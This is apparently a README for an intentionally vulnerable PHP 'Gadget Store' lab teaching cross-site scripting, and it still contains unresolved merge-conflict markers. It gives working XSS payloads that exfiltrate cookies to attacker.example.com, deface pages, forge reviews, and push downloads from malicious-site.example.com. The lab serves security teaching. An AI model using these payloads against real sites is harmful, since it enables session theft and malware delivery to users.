<<<<<<< HEAD
# XSS Lab - Gadget Store
=======
# Vulnerable Web Application Lab (Gadget Store)
>>>>>>> 9508d49 (docs: update README with detailed attack scenarios and fix comments)

This repository contains a PHP application intentionally designed with security vulnerabilities for educational purposes. It demonstrates common web-based attacks including Data Theft, Session Hijacking, Defacement, Reputation Damage, and Malware Distribution.

## Vulnerability Overview

<<<<<<< HEAD
### Credentials
- **Admin**: `admin` / `admin123`
- **User**: `victim` / `password123`
=======
The application is susceptible to Cross-Site Scripting (XSS) in several forms:
- **Reflected XSS**: In `search.php` (via `query` parameter) and `profile.php` (via `msg` parameter).
- **Stored XSS**: In `product.php` (via the customer review/comments section).
- **DOM-based XSS**: In `product.php` (via `promo` parameter in the URL).
>>>>>>> 9508d49 (docs: update README with detailed attack scenarios and fix comments)

## Attack Scenarios and Payloads

### 1. Data Theft
**Objective**: Steal sensitive information such as session cookies or user data from the page.
- **Vulnerability**: Stored XSS in `product.php`.
- **Method**: Post a review containing a script that sends the user's cookies to an external server.
- **Payload**:
  ```html
  <script>
    fetch('http://attacker.example.com/log?cookie=' + btoa(document.cookie));
  </script>
  ```
- **How to execute**: Login as any user, navigate to a product page, and post the above payload as a review. Any user (including admins) who views this product will have their cookies sent to the attacker's server.

### 2. Session Hijacking
**Objective**: Impersonate a legitimate user by stealing their session ID.
- **Vulnerability**: XSS (Reflected or Stored) combined with insecure session management.
- **Method**: Capture the `PHPSESSID` cookie using XSS and then use it to replace your own session cookie in the browser.
- **Payload**:
  ```html
  <script>
    new Image().src = "http://attacker.example.com/steal?sid=" + document.cookie;
  </script>
  ```
- **How to execute**: Inject the payload into a vulnerable field (e.g., a product review or a malicious link to `search.php`). Once the cookie is captured on the attacker's server, the attacker can set their own `PHPSESSID` cookie to the stolen value and gain access to the victim's account.

### 3. Defacement
**Objective**: Change the appearance of the website to spread a message or cause disruption.
- **Vulnerability**: Stored XSS in `product.php`.
- **Method**: Inject a script that modifies the DOM to replace the page content.
- **Payload**:
  ```html
  <script>
    document.body.innerHTML = '<div style="background:black;color:red;height:100vh;display:flex;align-items:center;justify-content:center;font-size:5rem;font-family:sans-serif;">HACKED BY EXPLOIT LAB</div>';
  </script>
  ```
- **How to execute**: Post this payload as a product review. Every user who visits the product page will see the defaced version instead of the store.

### 4. Reputation Damage
**Objective**: Damage the reputation of a user or the platform by posting unauthorized content.
- **Vulnerability**: Stored XSS.
- **Method**: Inject a script that automatically performs actions on behalf of the victim, such as posting fake reviews or changing profile information.
- **Payload (Automatic Review Poster)**:
  ```html
  <script>
    fetch('product.php?id=1', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'comment=This store is a scam! Do not buy anything!'
    });
  </script>
  ```
- **How to execute**: Post this as a review. When an admin or another user views the page, their browser will automatically post a new "scam" review under their own name.

### 5. Malware Distribution
**Objective**: Trick users into downloading malicious software.
- **Vulnerability**: DOM-based XSS or Reflected XSS.
- **Method**: Redirect users to a malicious download link or use an iframe to trigger a download automatically.
- **Payload (Redirect)**:
  ```html
  <script>
    window.location.href = "http://malicious-site.example.com/update.exe";
  </script>
  ```
- **Payload (Iframe Download)**:
  ```html
  <script>
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'http://malicious-site.example.com/malware.zip';
    document.body.appendChild(iframe);
  </script>
  ```
- **How to execute**: Send a victim a crafted link to a product with a malicious `promo` parameter:
  `http://localhost:8000/product.php?id=1&promo=<img src=x onerror="[PAYLOAD_HERE]">`

## Lab Environment Details
- **PHP Version**: 7.4+
- **Database**: SQLite3 (`database.db`)
- **Web Server**: Built-in PHP server (`php -S localhost:8000`)

---
<<<<<<< HEAD
=======
**Disclaimer**: This application is intentionally vulnerable and should only be used in a controlled, isolated lab environment for educational purposes.
>>>>>>> 9508d49 (docs: update README with detailed attack scenarios and fix comments)
